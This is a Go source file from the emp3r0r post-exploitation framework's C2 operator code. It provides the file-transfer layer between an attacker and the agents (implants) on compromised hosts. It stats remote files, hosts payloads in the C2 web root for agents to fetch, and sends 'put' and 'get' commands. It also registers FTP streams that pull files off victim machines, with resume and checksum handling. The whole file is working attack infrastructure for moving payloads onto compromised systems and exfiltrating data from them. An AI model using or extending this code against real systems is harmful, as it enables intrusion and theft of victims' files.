package ftp

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/fxamacker/cbor/v2"
	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/paths"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

type ExecCmdFunc func(string, string, string) error

// Inject this function to send command to agent
var ExecCmd ExecCmdFunc

// StatFile Get stat info of a file on agent
func StatFile(filepath string, a *def.Emp3r0rAgent) (fi *util.FileStat, err error) {
	cmd := fmt.Sprintf("%s --path %s", def.C2CmdStat, strconv.Quote(filepath))
	jobID := uuid.NewString()
	res, err := live.AwaitCmdResult(jobID, live.AgentReplyTimeout(), func() error {
		return ExecCmd(cmd, jobID, a.Tag)
	})
	if err != nil {
		return nil, fmt.Errorf("stat %s: %w", filepath, err)
	}

	var fileinfo util.FileStat
	if err := cbor.Unmarshal([]byte(res), &fileinfo); err != nil {
		return nil, fmt.Errorf("stat %s: %w", filepath, err)
	}
	return &fileinfo, nil
}

// HostFileForAgent publishes a local file in the C2 file directory and
// registers it for one agent, returning the hosted name the agent fetches it by
// plus the file's SHA-256.
//
// The hosted name is random and the registration is per agent: the C2 only
// serves a www name an operator registered for that agent, so an agent cannot
// pull arbitrary files out of the operator's www root.
func HostFileForAgent(lpath string, agent *def.Emp3r0rAgent) (name, checksum string, err error) {
	if agent == nil || agent.UUID == "" {
		return "", "", fmt.Errorf("no target agent")
	}
	fi, err := os.Stat(lpath)
	if err != nil {
		return "", "", fmt.Errorf("%s: %w", lpath, err)
	}
	if !fi.Mode().IsRegular() {
		return "", "", fmt.Errorf("%s: not a regular file", lpath)
	}

	name = fmt.Sprintf("%s.bin", util.RandHexString())

	checksum = crypto.SHA256SumFile(lpath)
	if !crypto.IsSHA256Hex(checksum) {
		return "", "", fmt.Errorf("hashing %s: %s", lpath, checksum)
	}

	hosted := filepath.Join(paths.WWWRoot, name)
	if err := util.Copy(lpath, hosted); err != nil {
		return "", "", fmt.Errorf("copy %s to %s: %w", lpath, hosted, err)
	}
	// The agent fetches this path over the www route, so a short copy would turn
	// into a truncated transfer with no obvious cause.
	copied, err := os.Stat(hosted)
	if err != nil {
		return "", "", fmt.Errorf("hosted copy %s: %w", hosted, err)
	}
	if copied.Size() != fi.Size() {
		return "", "", fmt.Errorf("hosted copy %s is %d bytes, want %d", hosted, copied.Size(), fi.Size())
	}
	if err := RegisterWWWDownload(name, agent.UUID, copied.Size(), checksum, true); err != nil {
		return "", "", err
	}
	logging.Infof("Hosted %s as %s for agent %s (%s)", lpath, hosted, util.AgentRef(agent.UUID), util.FormatBytes(copied.Size()))
	return name, checksum, nil
}

// RegisterDownloadRemote registers a download on the C2. A var so tests can
// stub the operator API.
var RegisterDownloadRemote = client.RegisterWWWDownload

// RegisterWWWDownload records one served file for one agent, locally (the
// operator serves it) and on the C2 (the C2 routes the agent's request).
// transient marks a one-shot copy that is removed once the transfer ends.
func RegisterWWWDownload(name, agentUUID string, size int64, checksum string, transient bool) error {
	network.WWWDownloads.Store("name:"+name, &network.WWWDownload{
		Name:            name,
		AgentUUID:       agentUUID,
		ExpectedSize:    size,
		Checksum:        checksum,
		OperatorSession: client.SessionID,
		Transient:       transient,
	})
	if err := RegisterDownloadRemote(name, agentUUID, size, checksum); err != nil {
		network.WWWDownloads.Delete("name:" + name)
		return fmt.Errorf("register download %s: %w", name, err)
	}
	return nil
}

// PutFile put file to agent. The destination path selects the storage: a
// memfs:/// key is kept in encrypted RAM, any other path is written to disk.
func PutFile(lpath, rpath string, a *def.Emp3r0rAgent) error {
	// file size
	size := util.FileSize(lpath)
	sizemB := float32(size) / 1024 / 1024
	// host the file and hash it in one step
	hosted, sum, err := HostFileForAgent(lpath, a)
	if err != nil {
		return err
	}
	logging.Notify(
		logging.INFO, "\nPutFile:\nUploading '%s' to\n'%s' "+
			"on %s, agent [%s]\n"+
			"size: %d bytes (%.2fMB)\n"+
			"sha256sum: %s",
		lpath, rpath,
		a.From, a.Name,
		size, sizemB,
		sum,
	)
	logging.Infof("%s is hosted as %s", lpath, filepath.Join(paths.WWWRoot, hosted))

	// send cmd
	// The agent fetches the file by the name the www route serves, not by the
	// operator's local path.
	cmd := fmt.Sprintf("put --file %s --path %s --checksum %s --size %d",
		strconv.Quote(hosted), strconv.Quote(rpath), strconv.Quote(sum), size)
	if err := ExecCmd(cmd, "", a.Tag); err != nil {
		return fmt.Errorf("PutFile send command: %v", err)
	}
	logging.Infof("Waiting for response from agent %s", a.Tag)
	return nil
}

// GenerateGetFilePaths generates paths and filenames for GetFile
func GenerateGetFilePaths(file_path string) (write_dir, save_to_file, tempname, lock string) {
	// We want to mirror the remote path structure locally.
	// But we must ensure it doesn't escape FileGetDir.
	// So we treat the remote absolute path as relative.

	// properties of the remote path
	// Use ToSlash to ensure consistent handling of separators
	cleanPath := filepath.ToSlash(filepath.Clean(file_path))

	// Strip absolute parts (drive letter and/or leading slash)
	// We want to treat the remote path as relative to our download directory
	relPath := cleanPath
	if vol := filepath.VolumeName(cleanPath); vol != "" {
		relPath = cleanPath[len(vol):]
	}
	relPath = strings.TrimLeft(relPath, "/")

	// Use SecureLocalPath to ensure the path is safe (no ../)
	// It now supports native paths and internally handles separator normalization
	localized, err := util.SecureLocalPath(relPath)
	if err != nil {
		logging.Debugf("GenerateGetFilePaths: unsafe path %q: %v. Using basename only.", file_path, err)
		localized = util.FileBaseName(filepath.Base(cleanPath)) // fallback to sanitized filename
	}
	if localized == "" || localized == "." {
		localized = "downloaded_file"
	}

	write_dir = filepath.Join(live.FileGetDir, filepath.Dir(localized))
	save_to_file = filepath.Join(write_dir, filepath.Base(localized))
	tempname = save_to_file + ".tmp"
	lock = save_to_file + ".lock"
	return write_dir, save_to_file, tempname, lock
}

// GetFileTransfer describes the transfer an agent has to perform for a remote
// path.
type GetFileTransfer struct {
	// Token is the FTP stream token the agent uploads to, or the token its
	// argument list requires when Listing is set.
	Token string
	// Offset is the number of bytes the agent has to skip because they are
	// already on disk.
	Offset int64
	// Listing means the remote path is a directory: the agent prints the
	// matching paths instead of uploading anything.
	Listing bool
	// Complete means the local copy already matches the remote checksum, so no
	// command has to be sent.
	Complete bool
	// Stream is the registered FTP stream that receives the upload. It is nil
	// unless the agent will upload; the legacy agent `get` path returns it to
	// its caller.
	Stream *network.StreamHandler
}

// PrepareGetFileStream resolves the local destination of a remote file,
// registers the FTP stream its upload will arrive on, and reports the token and
// resume offset the agent needs. Callers send the token to the agent
// themselves: GetFile sends it as a command flag, the module dispatcher packs it
// as a BOF argument.
func PrepareGetFileStream(filePath string, agent *def.Emp3r0rAgent) (*GetFileTransfer, error) {
	if agent == nil {
		return nil, fmt.Errorf("no target agent")
	}
	if util.FileBaseName(filepath.Base(filepath.Clean(filePath))) == "" {
		return nil, fmt.Errorf("invalid remote file path: %q", filePath)
	}

	fi, err := StatFile(filePath, agent)
	if err != nil {
		return nil, fmt.Errorf("stat %s: %w", filePath, err)
	}
	// A remote directory is never transferred: the agent lists the paths that
	// match the filter and only needs a token because its argument list
	// requires one.
	if strings.HasPrefix(fi.Permission, "d") {
		return &GetFileTransfer{Token: util.RandHexString(), Listing: true}, nil
	}

	fileSize := fi.Size
	if fileSize < 0 {
		return nil, fmt.Errorf("negative remote file size (%d) for %s", fileSize, filePath)
	}
	// Agents that cannot hash a file on stat report a placeholder instead of a
	// digest. The stream then carries no expected checksum and the receiving
	// side verifies the transferred size.
	checksum := strings.TrimSpace(fi.Checksum)
	if !crypto.IsSHA256Hex(checksum) {
		logging.Warningf("%s: agent reported no checksum (%q), verifying size only", filePath, checksum)
		checksum = ""
	}

	logging.Notify(logging.INFO, "Getting file '%s' from agent %s", filePath, agent.Tag)
	writeDir, saveToFile, tempname, lock := GenerateGetFilePaths(filePath)
	logging.Debugf("Get file: %s, save to: %s, tempname: %s, lock: %s", filePath, saveToFile, tempname, lock)

	if !util.IsDirExist(writeDir) {
		logging.Infof("Creating directory: %s", strconv.Quote(writeDir))
		if err := os.MkdirAll(writeDir, 0o700); err != nil {
			return nil, fmt.Errorf("mkdir %s: %w", writeDir, err)
		}
	}

	// is this file already being downloaded?
	if util.IsExist(lock) {
		return nil, fmt.Errorf("%s is already being downloaded", saveToFile)
	}

	// check if the local copy is already complete, which needs a digest to
	// compare against
	if checksum != "" && util.IsExist(saveToFile) {
		if crypto.SHA256SumFile(saveToFile) == checksum {
			logging.Successf("%s already exists, checksum matched", saveToFile)
			return &GetFileTransfer{Complete: true}, nil
		}
		logging.Warningf("%s already exists, but checksum mismatched", saveToFile)
	}

	if err := util.FileAllocate(saveToFile, fileSize); err != nil {
		return nil, fmt.Errorf("%s allocate file: %w", filePath, err)
	}
	if checksum == "" {
		logging.Infof("We will be downloading %s, %d bytes in total (size-only verification)", filePath, fileSize)
	} else {
		logging.Infof("We will be downloading %s, %d bytes in total (%s)", filePath, fileSize, checksum)
	}

	// what if we have downloaded part of the file
	var offset int64
	if util.IsExist(tempname) {
		offset = util.FileSize(tempname)
	}

	sh := &network.StreamHandler{
		// The receiving side reads the expected digest from the token, so the
		// format stays <random>-<checksum> even when the checksum is unknown.
		Token:           fmt.Sprintf("%s-%s", util.RandHexString(), checksum),
		OperatorSession: client.SessionID,
		ExpectedSize:    fileSize,
		Checksum:        checksum,
	}
	network.FTPStreams.Store(filePath, sh)
	network.FTPStreams.Store("token:"+sh.Token, sh)

	// Register with server if we are an operator client
	if err := client.RegisterFTPStream(sh.Token, filePath, fileSize, checksum); err != nil {
		logging.Errorf("GetFile: failed to register FTP stream on server: %v", err)
	}

	return &GetFileTransfer{Token: sh.Token, Offset: offset, Stream: sh}, nil
}

// getFile starts the legacy agent `get` command and returns its FTP stream.
// Agents that cannot run the get_file BOF (Windows, non-x86_64 Linux) keep
// using this path.
func getFile(filePath string, agent *def.Emp3r0rAgent) (*network.StreamHandler, error) {
	transfer, err := PrepareGetFileStream(filePath, agent)
	if err != nil {
		return nil, err
	}
	if transfer.Complete {
		return nil, nil
	}

	cmd := fmt.Sprintf("get --file_path %s --offset %d --token %s",
		strconv.Quote(filePath), transfer.Offset, strconv.Quote(transfer.Token))
	if err := ExecCmd(cmd, "", agent.Tag); err != nil {
		logging.Errorf("GetFile send command: %v", err)
		return nil, err
	}
	if transfer.Listing {
		return nil, nil
	}
	return transfer.Stream, nil
}

// DownloadFile downloads a file from URL using the provided HTTP client. A
// custom client lets callers route the transfer through the userspace
// WireGuard stack.
func DownloadFile(client *http.Client, url, filepath string) error {
	// Create the HTTP request
	resp, err := client.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err
}
